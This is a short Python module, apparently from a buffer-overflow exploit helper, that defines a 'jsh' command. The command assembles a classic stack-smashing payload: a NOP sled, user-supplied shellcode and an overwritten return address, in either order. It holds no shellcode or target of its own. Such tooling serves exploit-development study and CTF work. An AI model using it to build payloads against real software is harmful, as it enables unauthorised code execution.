#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from Command import Command
from Output import Output
from utils import format_hex_value


class JumpToShellcodeCommand(Command):
    command = "jsh"
    usage = "[Shellcode addr. | Buffer addr.] [before(default) | after](optional)"
    help = "\tJump to a shellcode."

    def set_option(self, option, cmd):

        output = Output()

        if option.buffSize == 0:
            output.write_error_message("Buffer size must be set to execute this command")
            return

        value = format_hex_value(cmd[1], option)

        if len(cmd) > 2 and cmd[2] == "after":
            option.payload = '"\\x90" * ' + str(option.buffSize) + ' + "' + value + '" + "' + option.shellcode + '"'
        else:
            size = option.buffSize - (len(option.shellcode) / 4)
            option.payload = '"' + option.shellcode + '" + "\\x90" * ' + str(int(size)) + ' + "' + value + '"'
